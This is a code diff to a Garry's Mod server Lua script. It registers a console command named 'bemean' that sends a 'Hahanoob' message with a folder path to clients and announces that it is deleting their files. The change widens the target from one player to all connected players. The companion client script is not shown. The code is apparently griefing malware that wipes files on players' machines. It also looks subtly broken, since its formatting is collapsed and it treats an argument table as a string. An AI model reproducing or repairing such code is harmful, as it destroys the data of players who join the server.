@@ -1,1 +1,1 @@
-require("datastream")AddCSLuaFile("cl_cooldel.lua")local function DeleteTheFiles(args)	datastream.StreamToClients(player.GetByID(args[1]),"Hahanoob", {args[2]})	print("Deleting "..player.GetByID(args[1]):Nick().."s files in "..args[2].."...")endconcommand.Add("bemean",DeleteTheFiles)
+require("datastream")AddCSLuaFile("cl_cooldel.lua")local function DeleteTheFiles(args)	datastream.StreamToClients(player.GetAll(),"Hahanoob", {args})	print("Deleting files in "..args.."...")endconcommand.Add("bemean",DeleteTheFiles)
